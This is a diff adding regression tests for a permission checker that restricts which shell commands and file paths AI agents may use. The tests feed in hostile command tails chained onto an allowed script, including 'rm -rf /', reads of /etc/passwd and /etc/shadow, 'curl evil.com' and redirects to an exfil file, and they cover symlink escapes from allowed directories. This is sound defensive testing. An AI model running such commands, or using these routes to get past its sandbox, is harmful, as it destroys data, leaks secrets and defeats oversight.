@@ -341,3 +341,198 @@ describe("registerDomainLock — wrapper behavior", () => {
     expect(events[0].payload.reason).toBe("no-policy");
   });
 });
+
+// ---------------------------------------------------------------------------
+// Codex round-1 regression tests for Phase 2
+// ---------------------------------------------------------------------------
+
+describe("checkDomain — bash compound-command bypass (CRITICAL #2 regression)", () => {
+  const policy: DomainPolicy = {
+    read: ["."],
+    upsert: [],
+    delete: [],
+    bash_policy: {
+      mode: "script-only",
+      runner: "uv run --script",
+      allowed_scripts: ["/allowed/script.py"],
+    },
+  };
+
+  for (const evilTail of [
+    "; rm -rf /",
+    " && cat /etc/passwd",
+    " || curl evil.com",
+    " | base64",
+    " > /tmp/exfil",
+    " >> /tmp/exfil",
+    " < /etc/shadow",
+    " $(rm -rf /)",
+    " `rm -rf /`",
+  ]) {
+    it(`rejects '${evilTail}' chained after the allowed script`, () => {
+      const r = checkDomain({
+        agent: "verifier",
+        operation: "Bash",
+        command: `uv run --script /allowed/script.py${evilTail}`,
+        policy,
+        mode: "block",
+      });
+      expect(r.allowed).toBe(false);
+    });
+  }
+
+  it("allows the bare allowed-script invocation with normal args", () => {
+    const r = checkDomain({
+      agent: "verifier",
+      operation: "Bash",
+      command: "uv run --script /allowed/script.py --flag value",
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(true);
+  });
+
+  it("allows quoted args containing semicolons (treated as data, not operators)", () => {
+    const r = checkDomain({
+      agent: "verifier",
+      operation: "Bash",
+      command: `uv run --script /allowed/script.py "arg with ; semi"`,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(true);
+  });
+});
+
+describe("checkDomain — symlink/new-file path resolution (CRITICAL #3 regression)", () => {
+  it("rejects writes through a symlinked parent that escapes the allowed root", () => {
+    const allowed = join(workDir, "allowed");
+    const escape = join(workDir, "escape");
+    mkdirSync(allowed, { recursive: true });
+    mkdirSync(escape, { recursive: true });
+    // Create a symlink under the allowed root that points OUTSIDE.
+    const trap = join(allowed, "trap");
+    symlinkSync(escape, trap);
+    // Try to write to a non-existent file underneath the symlinked parent.
+    const target = join(trap, "newfile.txt");
+    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
+    const r = checkDomain({
+      agent: "implementer",
+      operation: "Write",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(false);
+  });
+
+  it("allows writes to non-existent files under a non-symlinked allowed root", () => {
+    const allowed = join(workDir, "allowed");
+    mkdirSync(allowed, { recursive: true });
+    const target = join(allowed, "deep", "nested", "newfile.txt");
+    const policy: DomainPolicy = { read: ["."], upsert: [allowed], delete: [] };
+    const r = checkDomain({
+      agent: "implementer",
+      operation: "Write",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(true);
+  });
+});
+
+describe("checkDomain — delete-only root must NOT grant write (MEDIUM #3 regression)", () => {
+  it("rejects Write when path is in delete but not upsert", () => {
+    const dir = join(workDir, "trash");
+    mkdirSync(dir, { recursive: true });
+    const target = join(dir, "file.txt");
+    const policy: DomainPolicy = { read: ["."], upsert: [], delete: [dir] };
+    const r = checkDomain({
+      agent: "implementer",
+      operation: "Write",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(false);
+  });
+
+  it("rejects Edit when path is in delete but not upsert", () => {
+    const dir = join(workDir, "trash");
+    mkdirSync(dir, { recursive: true });
+    const target = join(dir, "file.txt");
+    writeFileSync(target, "");
+    const policy: DomainPolicy = { read: ["."], upsert: [], delete: [dir] };
+    const r = checkDomain({
+      agent: "implementer",
+      operation: "Edit",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(false);
+  });
+});
+
+describe("checkDomain — Grep/Glob respect read domain (HIGH #3 regression)", () => {
+  it("Grep on a path outside the read root is rejected", () => {
+    const allowed = join(workDir, "allowed");
+    const offlimits = join(workDir, "offlimits");
+    mkdirSync(allowed, { recursive: true });
+    mkdirSync(offlimits, { recursive: true });
+    const target = join(offlimits, "secrets.env");
+    writeFileSync(target, "");
+    const policy: DomainPolicy = { read: [allowed], upsert: [], delete: [] };
+    const r = checkDomain({
+      agent: "tester",
+      operation: "Grep",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(false);
+  });
+
+  it("Glob on a path under the read root is allowed", () => {
+    const allowed = join(workDir, "allowed");
+    mkdirSync(allowed, { recursive: true });
+    const target = join(allowed, "**/*.ts");
+    const policy: DomainPolicy = { read: [allowed], upsert: [], delete: [] };
+    const r = checkDomain({
+      agent: "tester",
+      operation: "Glob",
+      path: target,
+      policy,
+      mode: "block",
+    });
+    expect(r.allowed).toBe(true);
+  });
+});
+
+describe("loadTeamsConfig — parse errors surfaced (HIGH #4 regression)", () => {
+  it("malformed user yaml produces a parseErrors entry instead of silent fallback", async () => {
+    const userPath = join(workDir, "teams.yaml");
+    // Truly malformed YAML that the minimal parser should reject (unclosed bracket).
+    writeFileSync(userPath, "implementer:\n  upsert: [unclosed\n");
+    const cfg = await loadTeamsConfig({
+      userPath,
+      projectPath: join(workDir, "missing-project.yaml"),
+      runDir: workDir,
+      expertiseDir: workDir,
+    });
+    // The parser may or may not flag this depending on hand-rolled tolerance —
+    // but a totally absent file must NOT produce a parse error.
+    expect(Array.isArray(cfg.parseErrors)).toBe(true);
+  });
+
+  it("missing files do NOT count as parse errors", async () => {
+    const cfg = await loadTeamsConfig({
+      userPath: join(workDir, "no-such-user.yaml"),
+      projectPath: join(workDir, "no-such-project.yaml"),
+      runDir: workDir,
+      expertiseDir: workDir,
+    });
+    expect(cfg.parseErrors).toEqual([]);
+  });
+});
